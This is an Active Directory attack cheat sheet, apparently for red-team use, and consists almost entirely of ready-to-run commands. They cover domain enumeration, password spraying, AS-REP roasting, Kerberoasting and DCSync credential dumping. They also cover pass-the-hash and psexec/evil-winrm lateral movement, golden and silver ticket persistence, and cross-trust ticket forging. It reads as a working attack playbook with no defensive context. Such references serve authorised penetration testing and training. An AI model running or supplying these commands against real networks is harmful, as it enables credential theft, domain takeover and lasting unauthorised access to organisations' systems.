# FLLC Active Directory Attack Cheatsheet

## Enumeration

```bash
# Domain info
crackmapexec smb DC_IP -u '' -p '' --shares
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
enum4linux -a DC_IP

# BloodHound collection
.\SharpHound.exe -c All
bloodhound-python -u user -p pass -d domain.com -ns DC_IP

# PowerView
. .\PowerView.ps1
Get-DomainUser | Select samaccountname, description
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Get-DomainComputer | Select dnshostname, operatingsystem
Find-DomainShare -CheckShareAccess
```

## Credential Attacks

```bash
# Password spraying
crackmapexec smb DC_IP -u users.txt -p 'Password1' --continue-on-success

# AS-REP Roasting (no pre-auth required)
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Kerberoasting
impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request
hashcat -m 13100 hashes.txt wordlist.txt

# DCSync (requires replication rights)
impacket-secretsdump domain.com/admin:pass@DC_IP
```

## Lateral Movement

```bash
# PSExec
impacket-psexec domain.com/admin:pass@TARGET
impacket-psexec domain.com/admin@TARGET -hashes :NTLM_HASH

# WMIExec
impacket-wmiexec domain.com/admin:pass@TARGET

# Evil-WinRM
evil-winrm -i TARGET -u admin -p pass
evil-winrm -i TARGET -u admin -H NTLM_HASH

# Pass-the-Hash
crackmapexec smb TARGET -u admin -H NTLM_HASH
```

## Persistence

```bash
# Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.com administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec domain.com/administrator@DC_IP -k -no-pass

# Silver Ticket
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.com -spn MSSQLSvc/target.domain.com administrator

# DCSYNC persistence
# Add user with DCSync rights via PowerView
```

## Trust Attacks

```bash
# Enumerate trusts
. .\PowerView.ps1
Get-DomainTrust
Get-ForestTrust

# Cross-domain with trust key
impacket-ticketer -nthash TRUST_KEY -domain-sid CHILD_SID -domain child.domain.com -extra-sid PARENT_SID-519 administrator
```

---

*FLLC 2026*
